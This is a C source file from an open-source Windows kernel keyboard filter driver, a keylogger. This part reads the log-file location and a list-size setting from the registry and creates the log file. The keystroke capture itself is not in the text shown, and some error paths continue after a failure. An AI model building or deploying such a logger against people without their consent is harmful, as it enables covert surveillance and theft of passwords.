
/*
 *   Keyboard Device Logger
 *   Copyright (C) 2005 Jason Todd
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *
 *   This is a simple keyboard device filter that attaches itself to the kbclass
 *   and gleams scan codes from the IRP as they pass up the stack.
 *
 *   This file handles all the disk file related functions.
 *
 *   REFERENCE for this code :
 *    Programing the Microsoft Windows Driver Model - Walter Oney : ISBN 0-7356-1803-8
 *    kbfilter.c - DDK
 *    Ctrl2Cap 2.0 - http://www.sysinternals.com/
 *    KLog 1.0 - http://www.rootkit.com/
 */

#include "kdl.h"
#include "kdlregistry.h"
#include "kdlfile.h"

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Open registry and obtain our log file location
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID OpenRegKeyStorage( IN PDEVICE_OBJECT theDeviceObject )
{

HANDLE                           hkey;
PVOID                            Data;
NTSTATUS                         Status;
UNICODE_STRING                   KeyName;
UNICODE_STRING                   KeyValue;
ULONG                            ResultLength;
PKEY_VALUE_PARTIAL_INFORMATION   KeyValueInfo;
OBJECT_ATTRIBUTES                KeyObjectAttributes;
OBJECT_ATTRIBUTES                SubKeyObjectAttributes;


    // DDK : "Macro initializes the opaque OBJECT_ATTRIBUTES structure, which specifies 
    //        the properties of an object handle to routines that open handles."
    InitializeObjectAttributes ( &KeyObjectAttributes,                    // InitializedAttributes
                                 &gRegistryPath,                          // ObjectName
                                 OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,// Attributes
                                 NULL,                                    // RootDirectory
                                 NULL );                                  // SecurityDescriptor

    // Open a handle to the driver regkey
    Status = ZwOpenKey( &hkey,                 // KeyHandle
                        KEY_READ,              // DesiredAccess
		                &KeyObjectAttributes );// ObjectAttributes

    // If we fail this check we most likely have more problems then we can deal with anyways
	if ( !NT_SUCCESS( Status ) )
	{
KdPrint( ("ZwOpenKey() Failure in OpenRegKeyFile()\n") );
	}


    RtlInitUnicodeString( &KeyName, L"Storage" );
	// Open our subkey for our log file location
	Status = ZwQueryValueKey( hkey,
                              &KeyName,
                              KeyValuePartialInformation,
                              NULL,
                              0,
                              &ResultLength );

    // Error catch if the key was not found
    if ( Status == STATUS_INVALID_PARAMETER  ) 
	{
KdPrint( ("ZwQueryValueKey() Failed in OpenRegKey()\n") );
	}

    // Allocate some memory for our returned key structure
    KeyValueInfo = ( PKEY_VALUE_PARTIAL_INFORMATION ) ExAllocatePoolWithTag( NonPagedPool, 
		                                                                     ResultLength, 
																		     POOL_TAG_REGISTRY_STORAGE_KEY );
    // Requery the key with proper size requirements of the return structure
    Status = ZwQueryValueKey( hkey,
                              &KeyName,
                              KeyValuePartialInformation,
                              KeyValueInfo,
                              ResultLength,
                              &ResultLength );

    // Allocate memory for the return file path
	Data = ExAllocatePoolWithTag( NonPagedPool, 
		                          ResultLength  + sizeof( WCHAR ),
							      POOL_TAG_REGISTRY_STORAGE ); 

    RtlZeroMemory( Data, ResultLength + sizeof( WCHAR ) );

    RtlCopyMemory( Data, (PVOID) KeyValueInfo->Data, KeyValueInfo->DataLength );

    RtlInitUnicodeString( &KeyValue, Data );

    // DDK : "Macro initializes the opaque OBJECT_ATTRIBUTES structure, which specifies 
    //        the properties of an object handle to routines that open handles."
	InitializeObjectAttributes( &SubKeyObjectAttributes,                 // InitializedAttributes
		                        &KeyValue,                               // ObjectName
								OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,// Attributes
								NULL,                                    // RootDirectory
								NULL );                                  // SecurityDescriptor

   // Create our log file on disk
   CreateLogFile( theDeviceObject, SubKeyObjectAttributes );

   // Free working key value
   ExFreePoolWithTag( Data , POOL_TAG_REGISTRY_STORAGE );
   // Free key
   ExFreePoolWithTag( KeyValueInfo, POOL_TAG_REGISTRY_STORAGE_KEY );
   // Close the regkey
   ZwClose( hkey );
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Open registry and obtain our max size of out list cache
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
BOOLEAN OpenRegKeyMaxList( IN PDEVICE_OBJECT theDeviceObject )
{

PDEVICE_EXTENSION             theDeviceExtension;
HANDLE                        hkey;
NTSTATUS                      Status;
OBJECT_ATTRIBUTES             ObjectAttributes;
UNICODE_STRING                MaxListKey;
PKEY_VALUE_FULL_INFORMATION   keyValue;
ULONG                         Length;
ULONG                         ResultLength;



   theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension;
    // DDK : "Macro initializes the opaque OBJECT_ATTRIBUTES structure, which specifies 
    //        the properties of an object handle to routines that open handles."
    InitializeObjectAttributes ( &ObjectAttributes,
                                 &gRegistryPath,
                                 OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
                                 NULL,
                                 NULL );

    // Open a handle to the driver regkey
    Status = ZwOpenKey( &hkey,              // KeyHandle
                        KEY_READ,           // DesiredAccess
		                &ObjectAttributes );// ObjectAttributes

    // If we have a failure use the default value
	if ( !NT_SUCCESS( Status ) )
	{
KdPrint( ("KDL : ZwOpenKey() Failure in OpenRegKeyMaxList()\n") );

     // If we could not access the regkey then use our default value
     theDeviceExtension->MaxListSize = DEFAULT_MAX_LIST_SIZE;
	 return FALSE;
	}

    //
    RtlInitUnicodeString( &MaxListKey, L"MaxList" );
    // Amount of memory we will need to allocate
    Length = sizeof( KEY_VALUE_FULL_INFORMATION ) + MaxListKey.Length * sizeof( WCHAR ) + sizeof( ULONG );
    // Allocate temporary memory for our key
    keyValue = ExAllocatePoolWithTag( NonPagedPool,
                                      Length,
                                      POOL_TAG_REGISTRY_MAXLIST );
    // Query our key for our value
    Status = ZwQueryValueKey( hkey,                   // KeyHandle 
                              &MaxListKey,            // ValueName
                              KeyValueFullInformation,// KeyValueInformationClass
                              keyValue,               // KeyValueInformation
                              Length,                 // Length
                              &ResultLength );        // ResultLength
    // If we have a failure use the default value
	if ( !NT_SUCCESS( Status ) )
	{
KdPrint( ("KDL : ZwQueryValueKey() Failure in OpenRegKeyMaxList()\n") );
     // If we had a problem reading the key then use the default value
     theDeviceExtension->MaxListSize = DEFAULT_MAX_LIST_SIZE;
	 return FALSE;
	}

	// Set our value from the key into our DEVICE_EXTENSION
	theDeviceExtension->MaxListSize = *( (PULONG)(((PCHAR)keyValue) + keyValue->DataOffset ));
	
KdPrint( ("KDL: theDeviceExtension->MaxListSize = %d\n", theDeviceExtension->MaxListSize) );

   // Free key from memory
   ExFreePoolWithTag( keyValue, POOL_TAG_REGISTRY_MAXLIST );
   // Close the regkey
   ZwClose( hkey );
 
 return TRUE;
}